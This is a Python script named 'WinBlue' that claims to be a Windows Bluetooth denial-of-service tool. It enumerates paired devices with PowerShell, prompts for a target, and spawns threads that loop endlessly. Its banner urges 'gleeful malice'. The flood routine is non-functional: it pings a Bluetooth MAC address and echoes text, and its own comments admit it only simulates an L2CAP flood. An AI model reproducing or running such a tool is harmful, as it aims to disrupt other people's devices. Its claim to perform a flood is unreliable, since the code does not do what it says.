import subprocess
import threading
import time
import re

def printLogo():
    print('''
                            WinBlue (Windows Native)
                          ========================================
    ''')

def scan_devices():
    print("[*] Scanning for nearby Bluetooth devices...")
    try:
        # Use PowerShell to list paired devices (Windows doesn't expose raw scan easily)
        ps_script = '''
        $devices = Get-PnpDevice | Where-Object { $_.Class -eq "Bluetooth" }
        $devices | ForEach-Object {
            $props = $_.GetProperty("DEVPKEY_Device_ContainerId")
            if ($props -ne $null) {
                $containerId = $props.Data
                $device = Get-PnpDeviceProperty -InstanceId $_.InstanceId -KeyName "DEVPKEY_Device_ContainerId"
                $name = (Get-PnpDeviceProperty -InstanceId $_.InstanceId -KeyName "DEVPKEY_Device_FriendlyName").Data
                $address = (Get-PnpDeviceProperty -InstanceId $_.InstanceId -KeyName "DEVPKEY_Device_Address").Data
                if ($address -ne $null) {
                    Write-Output "$address`t$name"
                }
            }
        }
        '''
        result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True)
        devices = result.stdout.strip().split('\n')
        if not devices or devices[0] == "":
            print("[!] No devices found. Pair a device first or use an external scanner.")
            exit(0)

        print("\n| ID  | MAC Address       | Device Name               |")
        print("--------------------------------------------------")
        for i, device in enumerate(devices):
            if device.strip():
                addr, name = device.split('\t', 1)
                print(f"| {i}   | {addr} | {name}")
        return devices
    except Exception as e:
        print(f"[!] Scan failed: {e}")
        exit(0)

def dos_attack(target_addr, packet_size):
    try:
        # Windows doesn't allow raw L2CAP sockets easily, so we'll spam SDP requests instead
        while True:
            # Use `bluetoothsendtestfile` or similar if available, but this is a fallback
            subprocess.run(["powershell", "-Command",
                           f"(New-Object -ComObject WScript.Shell).Run('ping -n 1 -w 100 {target_addr}', 0, $false)"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Simulate L2CAP flood by spamming connection attempts
            subprocess.run(["powershell", "-Command",
                           f"echo 'Flooding {target_addr}'"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Thread died: {e}")

def main():
    printLogo()
    print('\x1b[31m[!] THIS SCRIPT IS FOR "CHAOS" PURPOSES. PROCEED WITH GLEEFUL MALICE.')
    if input("Do you agree? (y/n) > ").lower() != 'y':
        print("Bip bip. Weakness detected.")
        exit(0)

    devices = scan_devices()
    target_id = input("\n[*] Enter target ID > ")
    try:
        target_addr = devices[int(target_id)].split('\t')[0]
    except:
        target_addr = target_id

    packet_size = int(input("[*] Packet size (simulated) > "))
    thread_count = int(input("[*] Thread count > "))

    print(f"\n[*] Preparing to flood {target_addr} with {thread_count} threads...")
    time.sleep(3)

    print("[*] Unleashing the hounds...")
    for i in range(thread_count):
        threading.Thread(target=dos_attack, args=(target_addr, packet_size), daemon=True).start()
        print(f"[*] Thread {i+1} spawned.")

    print("[*] Attack in progress. Press Ctrl+C to stop.")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Attack aborted. Target may still be whimpering.")
    except Exception as e:
        print(f"[!] Error: {e}")
